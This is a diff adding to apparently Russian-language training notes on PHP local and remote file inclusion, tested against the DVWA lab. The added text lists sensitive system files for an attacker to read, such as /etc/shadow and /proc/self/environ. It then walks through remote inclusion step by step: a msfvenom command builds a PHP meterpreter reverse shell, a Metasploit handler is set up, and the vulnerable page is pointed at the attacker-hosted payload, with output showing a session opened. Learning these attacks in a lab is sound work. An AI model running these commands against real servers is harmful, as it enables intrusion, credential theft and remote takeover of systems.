@@ -67,6 +67,9 @@ include($_SERVER["DOCUMENT_ROOT"] . '/' . $_GET['page'] . '.txt');
 http://somesite/include.php?page=/etc/passwd
 
 
+файлы с полезной информацией для злоумышлиника
+
+
 Трансформируется в такой:
 http://somesite/include.php?page=/etc/passwd.txt
 
@@ -82,4 +85,43 @@ $file = str_replace( array( "../", "..\"" ), "", $file );
 
 
 
+файлы с полезной информацией для злоумышлиника: 
+/etc/issue — текст сообщения, который выводится после входа пользователя в систему;
+/etc/passwd — файл пользователей и их паролей;
+/etc/shadow — файл паролей, тут можно увидеть их в виде хешей;
+/etc/group — группы и пользователи. Полезен для поиска пользователей системы;
+/etc/hosts — локальный файл для разрешения DNS-имен. Полезен для определения параметров хоста;
+/etc/motd — message of the day. Полезен, как и /etc/issue;
+/etc/mysql/my.cnf — конфигурационный файл mysql;
+/proc/[0-9]*/fd/[0-9]*  — первое число  показывает PID, второе — файловый дескриптор;
+/proc/self/environ — хранилище переменных сред;
+/proc/version — версия ядра и ОС;
+/proc/cmdline — содержатся все аргументы, переданные ядру в момент старта системы;
+/proc/mounts — точки монтирования;
+/proc/net/arp — таблица arp; 
+/proc/net/route — сведения о маршрутизации.
+
+RFI
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.105 LPORT=4444 -f raw > msf.php
+Затем отредактировать файл, добавив в него теги php, сценария (<?php в начале и ?> в конце). После чего полученный файл размещается на сервере атакующего и переименовывается в msf.txt. У файла выставляем права на выполнение (chmod a+x msf.txt).
+переносим файл в /var/www/html
+sf6 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.0.116
+LHOST => 192.168.0.116
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > exploit
+
+выполняем запрос к уязвимой странице где уязвимый параметр адрес на наш shell
+http://192.168.0.117/dvwa/vulnerabilities/fi/?page=http://192.168.0.116/msf.txt
+
+[*] Started reverse TCP handler on 192.168.0.116:4444 
+[*] Sending stage (39282 bytes) to 192.168.0.117
+[*] Meterpreter session 1 opened (192.168.0.116:4444 -> 192.168.0.117:33831) at 2021-06-19 15:08:54 -0400
+
+meterpreter > ls
+Listing: /var/www/html/dvwa/vulnerabilities/fi
 
